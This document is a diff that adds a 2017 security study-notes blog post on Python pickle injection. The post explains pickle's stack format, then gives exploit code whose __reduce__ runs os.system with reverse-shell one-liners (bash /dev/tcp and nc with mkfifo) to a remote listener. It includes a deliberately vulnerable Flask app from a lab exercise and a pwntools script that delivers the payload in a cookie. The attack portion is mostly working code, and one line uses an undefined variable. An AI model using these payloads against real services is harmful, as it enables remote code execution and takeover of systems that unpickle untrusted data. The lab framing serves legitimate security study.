@@ -1,0 +1,285 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Python Pickle Injection &middot; M1r4c13</title>
+<meta name="description" content="Python Pickle Injection -- M1r4c13 study notes, restored.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='2.2' fill='%23d8c08a'/%3E%3Ccircle cx='8' cy='8' r='6.5' fill='none' stroke='%23d8c08a' stroke-opacity='.35' stroke-width='.8'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+<header class="blog-head">
+<a class="mono back-link" href="/">xhyu@sky:~$ cd ~</a>
+<a class="brand brand-link" href="/blog/">M1r4c13</a>
+</header>
+<main><article class="post">
+<h1 class="post-title">Python Pickle Injection</h1>
+<p class="meta"><span class="mono meta-date">2017.04.30</span></p>
+<div class="post-body"><h5>Quick Explaination</h5>
+<h6>Example:</h6>
+<pre><code class="language-bash">root@kali:~# python
+&gt;&gt;&gt; import pickle
+&gt;&gt;&gt; lst=['abc', 123, 3.14]
+&gt;&gt;&gt; pickle.dumps(lst)
+&quot;(lp0\nS'abc'\np1\naI123\naF3.14\na.&quot;
+&gt;&gt;&gt; pd = pickle.dumps(lst)
+&gt;&gt;&gt; pickle.loads(pd)
+['abc', 123, 3.14]
+&gt;&gt;&gt; 
+</code></pre>
+<h6>Facts:</h6>
+<ul>
+<li>
+<p>Pickle is a python package used to 'serialize' an object to string format and store them to or load from a file.</p>
+</li>
+<li>
+<p>Pickle is a simple stack language, which means pickle has a variable <em>stack</em>. </p>
+</li>
+<li>Every time it finished 'deserializing' an object it stores it on the stack. </li>
+<li>
+<p>Every time it reaches a '.' while 'deserializing', it pop a variable from the stack.</p>
+</li>
+<li>
+<p>Besides, pickle has a temperary <em>memo</em>, like a clipboard.</p>
+</li>
+<li>'p0', 'p1' means <em>put</em> the top obj on the stack to memo and refer it as '0' or '1'</li>
+<li>
+<p>'g0', 'g1' act as <em>get</em> obj '0' or '1'</p>
+</li>
+<li>
+<p>Pickle has two packages: pickle and cPickle, they have some specific differences like different methods, but most of the case they act in the same way.</p>
+</li>
+</ul>
+<h5>Exec Function though Pickle Loading</h5>
+<h6>Exploit payload:</h6>
+<pre><code class="language-python">class Exploit(object):
+    def __reduce__(self):
+        #return (os.system, ('bash -i &gt;&amp; /dev/tcp/192.168.249.129/9001 0&gt;&amp;1',))
+        #return (os.system, ('whoami;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.249.129 9001 &gt;/tmp/f',))
+        return (os.system, ('whoami',))
+
+def calPayload():
+    return cPickle.dumps(Exploit())
+
+print '---------PAYLOAD BEGIN'
+print calPayload()
+print '---------PAYLOAD END'
+</code></pre>
+<pre><code class="language-bash">$ python epl.py
+---------PAYLOAD BEGIN
+cposix
+system
+p1
+(S'whoami'
+p2
+tp3
+Rp4
+.
+---------PAYLOAD END
+</code></pre>
+<h5>Pickle Injection Practice:</h5>
+<p>(ref:http://ptl-fc7f4ba0-95836d9d.libcurl.so/)</p>
+<p><strong>vulnerable.py</strong></p>
+<pre><code class="language-python">from flask import Flask, flash
+from flask import session, request, render_template, make_response, redirect, url_for
+from flask.ext.sqlalchemy import SQLAlchemy
+from sqlalchemy.exc import IntegrityError
+import os, hmac, base64, cPickle, hashlib, StringIO
+
+
+application = Flask(__name__)
+
+# os.random(400) - static key for CGI
+application.secret_key = '2c]E{&amp;\xc0V\xd8\x8d(w\xb5&lt;\x86 !\xda\x0css\xb7\xfbAaK\x0f\xfe]\xce\xa1VM\x9e&quot;\x19&lt;\xb9\xc6\xd4\x10\xadn\xd8\xcb\xff\tR\x0e\xc2\xcd\xd5\xd9\'\xa4\xd9\xe19\tl\x99&amp;\x9d8\xa8R\xfe\xccZ!\xb8\xa4\x94\x80/\x15\xa0\x90V\xc9\xe2OY\xdb\xbak\xe0,\x92\x0f2;\xca\'Kh\x0b\x0b\xd0\xc5\xf6l2\xccX\xe9;\xa5\xe1gK}q?A\xeb\xb7k1&quot;\xc1\x03\x18\xcb\xed\xe4\xa6+\xa1\x18\x02\xa6K\xa2\x00s\x90JE\xd9\x05\'\xf0\x89`?\xff\xfa\xb1\xbc^\xe2V\xe6\xb9\x86\xfa6\xe2z\xf1Lv\xe7[\x11-\'\xdft}\xbc\x95M9\x88\xd8#A\rb8\x0f)NG\xb0:F\xa5\t\xad\xc3\xd6\x85\x1a\xa7\x98\x16\x81d\xbaE\x92\xb9\x05y=\x82Q\xd0S\xde\xfc\x86\x08\xd9(\xbf\x0eDqo/\xda7\xa6A\x9f\xc2\xa0\x08\xba\xbc$,\xdd\x83N(\'\x1c\xf3\xc2lp\x98S*\xbb\x01\xf1\x1d\x88\x13\xfboQ\x10\x04\xdaSS\xba\x19RW\x98\xed\xcb\xae\x91\xb0SBw\xb7\xee\x15\xaf\x01^\x8f\x1aJ\xc8\x03\x82\x08w\xce\xa6y\xb3e\x8d\xae@g\x7fEY\xe3x\xe4\xeewd&amp;\xfd\xc9\xde~\r\xb5\x0b\x10\x12\xa7\xa3r\xbf\xf8\xbbE\xa0\xd4|\xb1\x95\x00\xa6\xe3I\xe6.\xb5\xf0rSh\xc1\x18\xf1B\x05x\xb0\x92\xfa\xd2\xa5\xc6\x97\x9cb\x84\x18\xb5P\xa2\xc6\xfc\xfe\xef\x11\xe1X\x1d\xe218 \xc6\xce\xcc\xed\x8c\xc9\xcd\x00\x17\xf0`X![\xf88\xf2&gt;LV\xe0\x0c\xd8\xbb\x05T\x8a'
+
+
+application.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/pentesterlab.db'
+db = SQLAlchemy(application)
+db.create_all()
+
+
+class User(db.Model):
+  id = db.Column(db.Integer, primary_key=True)
+  username = db.Column(db.String(255), unique=True)
+  password = db.Column(db.String(255), unique=False)
+
+  def __init__(self, username, password=&quot;&quot;):
+    self.username,self.password = username,hashlib.md5(password).hexdigest() 
+
+  def rememberme(self):
+    creds = [self.username , self.sign() ]
+    return base64.b64encode(cPickle.dumps(creds))
+
+  def sign(self):
+    return User.sign_username(self.username)
+
+  @classmethod
+  def sign_username(self,username):
+    return hmac.HMAC(application.secret_key, username).hexdigest()
+
+
+  @classmethod
+  def valid_rememberme(self, cookie):
+    user, sign = cPickle.load(StringIO.StringIO(base64.b64decode(cookie)))
+    if User.sign_username(user) == sign:
+      return True
+    return False
+
+  @classmethod
+  def from_rememberme(self, cookie):
+    user, sign= cPickle.load(StringIO.StringIO(base64.b64decode(cookie)))
+    return user
+
+
+  @classmethod
+  def valid_login(self,username,password):
+    user = User.query.filter_by(username=username).first()
+    if user and user.password == hashlib.md5(password).hexdigest():
+      return True
+    return False
+
+
+
+
+
+@application.route(&quot;/&quot;)
+def index():
+  name = None
+  if 'username' in session and session['username']:
+    name = session['username']
+  elif request.cookies.get('rememberme'):
+    if User.valid_rememberme(request.cookies.get('rememberme')):
+      session['username'] = User.from_rememberme(request.cookies.get('rememberme'))
+      name = session['username']
+
+  return render_template('index.html', name=name) 
+
+@application.route(&quot;/login&quot;, methods=['GET', 'POST'])
+def login():
+  if request.method == 'POST':
+      if User.valid_login(request.form['username'], request.form['password']):
+        response = make_response(redirect(url_for('index')))
+        if ('rememberme' in request.form) and request.form['rememberme']:
+          response.set_cookie('rememberme', User(request.form['username']).rememberme())
+        session['username'] = request.form['username']
+        return response
+      else:
+        flash('Invalid username/password', &quot;errror&quot;)
+        return render_template('login.html')
+  else: 
+    return render_template('login.html', error=None)
+
+@application.route(&quot;/register&quot;, methods=['GET', 'POST'])
+def register():
+  if request.method == 'POST':
+    if request.form['password'] != request.form['password_again']:
+      flash(&quot;Passwords don't match&quot;, &quot;errror&quot;)
+      return render_template('register.html')
+    else: 
+      u = User(request.form['username'],request.form['password'])
+      db.session.add(u) 
+      try:
+        db.session.commit()
+        flash(&quot;User successfully created&quot;, &quot;success&quot;)
+        return render_template('login.html')
+      except IntegrityError: 
+        flash(&quot;Cannot create user (user exists)...&quot;, &quot;error&quot;)
+        return render_template('register.html')
+
+  else:
+    return render_template('register.html')
+
+
+
+@application.route(&quot;/logout&quot;)
+def logout():
+  response = make_response(redirect(url_for('index')))
+  session.pop(&quot;username&quot;,None)
+  response.set_cookie('rememberme', &quot;&quot;)
+  return response
+
+
+
+
+
+
+# register page
+# login page
+# send back a cookie pickled username signed
+
+if __name__ == &quot;__main__&quot;:
+  application.debug = True
+  application.run()
+
+#  def verifyAuth(self, headers):
+#    try:
+#      token = cPickle.loads(base64.b64decode(headers['AuthToken']))
+#      if not check_hmac(token['signature'], token['data'], getSecretKey()):
+#        raise AuthenticationFailed
+#      self.secure_data = token['data']
+#    except:
+#      raise AuthenticationFailed
+</code></pre>
+<p><strong>epl.py</strong></p>
+<pre><code class="language-python">from pwn import *
+import cPickle
+import os
+import base64
+from optparse import OptionParser
+
+class Exploit(object):
+    def __reduce__(self):
+        #return (os.system, ('bash -i &gt;&amp; /dev/tcp/192.168.249.129/9001 0&gt;&amp;1',))
+        return (os.system, ('whoami;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.249.129 9001 &gt;/tmp/f',))
+
+def calPayload():
+    pd=cPickle.dumps(Exploit())
+    print 'pd', pd
+    return base64.b64encode(pd)
+
+def exploit(addr, port):
+    sock=remote(addr, port)
+
+    payload='''GET / HTTP/1.1
+Host: 0.0.0.0:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: session=aeyJ1c2VybmFtZSI6ImEifQ.C-a8Kg.llYFXMJm949I05GvNUfrYehd3Uk; rememberme=&quot;'''+calPayload()+'''&quot;
+Connection: close
+
+    '''
+# as long as session is an invalid one, we are good.
+    sock.send(payload)
+
+cPickle.load(StringIO.StringIO(base64.b64decode(pl)))
+
+if __name__ == '__main__':
+    parser = OptionParser()
+    parser.add_option('-s',dest='address',metavar=&quot;Address&quot;)
+    parser.add_option('-p',dest='port',metavar=&quot;Port&quot;)
+    (options, args)=parser.parse_args()
+    if options.address == None or options.port == None:
+        parser.error('')
+    else:
+        exploit(options.address, int(options.port))
+
+</code></pre>
+<h5>References</h5>
+<ul>
+<li>https://docs.python.org/2/library/pickle.html</li>
+<li>https://lincolnloop.com/blog/playing-pickle-security/</li>
+<li>http://peadrop.com/blog/2007/06/18/pickle-an-interesting-stack-language/</li>
+<li>https://github.com/Gallopsled/pwntools (recommend)</li>
+<li><a href="https://docs.oracle.com/cd/E18930_01/html/821-2426/gksja.html">sshd setup</a></li>
+<li><a href="http://flask.pocoo.org/docs/0.12/extensiondev/">flask (ext)</a></li>
+</ul></div>
+</article></main>
+<footer class="blog-foot">
+ <p class="mono foot-line">m1r4c13 &middot; study notes &middot; 2017 to 2018 &middot; restored</p>
+ <p class="coda"><span class="cn-inline">世界并不完美，却令人着迷。</span></p>
+</footer>
+</body>
+</html>
